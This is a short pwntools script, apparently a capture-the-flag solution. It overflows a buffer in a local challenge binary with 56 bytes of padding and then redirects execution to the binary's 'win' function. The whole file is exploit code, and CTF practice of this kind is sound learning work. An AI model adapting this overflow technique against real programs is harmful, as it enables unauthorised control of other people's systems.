#!/usr/bin/python3

from pwn import *

context.binary=exe=ELF('./chall', checksec=False)
p = process('./chall')
#p=process(exe.path)
#input()
payload = b'A'*56
payload += p64(exe.sym['win']+1)
p.sendafter(b's play', payload)

p.interactive()
